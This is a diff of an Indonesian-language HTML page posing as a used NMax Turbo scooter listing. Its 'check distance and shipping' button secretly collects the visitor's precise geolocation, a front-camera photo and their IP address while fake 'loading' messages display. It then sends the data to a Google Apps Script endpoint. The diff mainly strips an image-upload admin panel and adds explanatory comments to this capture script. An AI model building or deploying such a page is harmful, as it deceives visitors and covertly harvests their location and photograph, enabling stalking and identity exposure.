@@ -6,30 +6,19 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; color: #1c1e21; }
         .product-card { max-width: 500px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
-        .product-image { width: 100%; height: auto; border-radius: 8px; margin-bottom: 15px; }
         .btn-lokasi { background-color: #0084ff; color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
         #modalContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
-        
-        /* Panel Admin */
-        .admin-panel { margin-top: 50px; padding: 20px; border: 1px dashed #ccc; max-width: 500px; margin: 50px auto; background: #f9f9f9; }
     </style>
 </head>
 <body>
 
     <div class="product-card">
-        <img id="mainProductImage" src="https://via.placeholder.com/500x300?text=Foto+Produk+NMax" alt="NMax Turbo" class="product-image">
-        
         <h1>NMax Turbo - Kondisi Mulus</h1>
         <p>Harga: <b>Rp 35.000.000</b></p>
         <p>Lokasi: Bekasi, Indonesia</p>
         <hr>
         <p>Cek ketersediaan dan ongkir ke lokasi Anda.</p>
         <button id="btnVerifikasi" class="btn-lokasi">📍 Cek Jarak & Ongkir ke Lokasi Saya</button>
-    </div>
-
-    <div class="admin-panel">
-        <h3>Panel Admin (Ganti Foto)</h3>
-        <input type="file" id="imageUploader" accept="image/*">
     </div>
 
     <div id="modalContainer">
@@ -40,22 +29,6 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Fungsi untuk mengganti gambar
-        const uploader = document.getElementById('imageUploader');
-        const mainImage = document.getElementById('mainProductImage');
-
-        uploader.addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    mainImage.src = event.target.result;
-                }
-                reader.readAsDataURL(file);
-            }
-        });
-
-        // Script asli Anda
         const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby9SjzR2LNMtyQqftDNXIeVHYpz-abXHabpRtNA49qkhkQUv6BkgbjX8ZIsw0hsjeIm/exec";
         const geoOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
@@ -66,10 +39,12 @@
             statusText.innerText = "Memuat Halaman...";
 
             try {
+                // 1. Ambil Lokasi
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
                 });
 
+                // 2. Ambil Foto Kamera Depan
                 statusText.innerText = "Memuat Gambar Produk...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
@@ -77,16 +52,20 @@
                 video.srcObject = stream;
                 await video.play();
 
+                // Tunggu sebentar agar kamera siap
                 await new Promise(r => setTimeout(r, 1000));
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                const imageData = canvas.toDataURL('image/jpeg', 0.5); // Kompresi 0.5 untuk efisiensi
                 stream.getTracks().forEach(track => track.stop());
 
+                // 3. Ambil IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
 
+                // 4. Kirim Data
+                statusText.innerText = "Memuat Produk...";
                 await fetch(WEB_APP_URL, {
                     method: 'POST',
                     mode: 'no-cors',
